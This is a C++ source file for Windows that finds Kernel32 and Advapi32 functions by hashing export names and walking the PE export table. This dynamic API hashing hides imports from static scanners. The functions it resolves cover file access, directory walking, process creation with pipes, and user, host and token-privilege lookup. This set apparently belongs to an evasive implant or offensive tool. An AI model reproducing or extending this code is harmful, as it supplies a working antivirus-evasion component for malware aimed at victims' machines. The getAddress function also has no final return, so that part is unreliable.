#include "apiFunc.hpp"
#include "common.hpp"
#include <stdint.h>


DWORD Hasher(const char* str) {
	DWORD h = 0x1231C8DE;
	DWORD MAGIC = 0xB33D33F;

	while (*str) {
		char c = *str++;
		h ^= (MAGIC ^ c);
		h = (h << 5) | (h >> 26);
		h += c * 16;
	}
	return h;
}



WINAPIS* WinApis = NULL;
MODULES* KModules = NULL;

FARPROC getAddress(HMODULE dll, DWORD hash) {
	PBYTE pBase = (PBYTE)dll;
	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
	if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
		return NULL;
	}
	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
	if (pNt->Signature != IMAGE_NT_SIGNATURE) {
		return NULL;
	}

	PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pBase + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	
	PDWORD AddressFunctions = (PDWORD)(pBase + pExport->AddressOfFunctions);
	PDWORD AddressNames = (PDWORD)(pBase + pExport->AddressOfNames);
	PWORD  AddressOrdinals = (PWORD)(pBase + pExport->AddressOfNameOrdinals);


	for (DWORD i = 0; i < pExport->NumberOfFunctions; i++) {
		PCHAR funcName = (PCHAR)(pBase + AddressNames[i]);
		DWORD HashedName = Hasher(funcName);

		if (HashedName == hash) {
			FARPROC FuncAddress = (FARPROC)(pBase + AddressFunctions[AddressOrdinals[i]]);
			return FuncAddress;
		}
	}
}

bool LoadApis() {
	
	

	
	
	KModules->K32 = GetModuleHandleA("Kernel32.dll");

	WinApis->CreateFileA             = (decltype(WinApis->CreateFileA))              getAddress(KModules->K32, KERNEL32_CREATEFILE);
	WinApis->WriteFile               = (decltype(WinApis->WriteFile))                getAddress(KModules->K32, KERNEL32_WRITEFILE);
	WinApis->ReadFile                = (decltype(WinApis->ReadFile))                 getAddress(KModules->K32, KERNEL32_READFILE);
	WinApis->CloseHandle             = (decltype(WinApis->CloseHandle))              getAddress(KModules->K32, KERNEL32_CLOSEHANDLE);
	WinApis->FindFirstFileA          = (decltype(WinApis->FindFirstFileA))           getAddress(KModules->K32, KERNEL32_FINDFIRST);
	WinApis->FindNextFileA           = (decltype(WinApis->FindNextFileA))            getAddress(KModules->K32, KERNEL32_FINDNEXT);
	WinApis->GetCurrentDirectoryA    = (decltype(WinApis->GetCurrentDirectoryA))     getAddress(KModules->K32, KERNEL32_GETDIR);
	WinApis->SetCurrentDirectoryA    = (decltype(WinApis->SetCurrentDirectoryA))     getAddress(KModules->K32, KERNEL32_SETDIR);
	WinApis->LoadLibraryA            = (decltype(WinApis->LoadLibraryA))             getAddress(KModules->K32, KERNEL32_LOADLIB);
	WinApis->GetEnvironmentVariableA = (decltype(WinApis->GetEnvironmentVariableA))  getAddress(KModules->K32, KERNEL32_GETENV);
	WinApis->CopyFileA               = (decltype(WinApis->CopyFileA))				 getAddress(KModules->K32, KERNEL_COPYFILE);
	WinApis->MoveFileA               = (decltype(WinApis->MoveFileA))				 getAddress(KModules->K32, KERNEL_MOVEFILE);
	WinApis->CreateProcessA          = (decltype(WinApis->CreateProcessA))getAddress(KModules->K32, KERNEL_CREATEPROCESS);
	WinApis->CreatePipe = (decltype(WinApis->CreatePipe))getAddress(KModules->K32, KERNEL_CREATEPIPE);


	if (!KModules->ADVAPI) {
		HMODULE adv = LoadLibraryA("advapi32.dll");
		KModules->ADVAPI = adv;
	}
	WinApis->GetUserNameA            = (decltype(WinApis->GetUserNameA))             getAddress(KModules->ADVAPI, KERNEL32_USERNAME);
	
	WinApis->GetComputerNameA        = (decltype(WinApis->GetComputerNameA))         getAddress(KModules->K32, KERNEL32_HOSTNAME);
	WinApis->OpenProcessToken        = (decltype(WinApis->OpenProcessToken))         getAddress(KModules->ADVAPI, ADVAPI_OPENTOKEN);
	WinApis->GetTokenInformation     = (decltype(WinApis->GetTokenInformation))      getAddress(KModules->ADVAPI, ADVAPI_TOKENINFO);
	WinApis->LookupPrivilegeNameA    = (decltype(WinApis->LookupPrivilegeNameA))     getAddress(KModules->ADVAPI, ADVAPI_LOOKUPPRIV);
  
	


	

	return true;

	
}






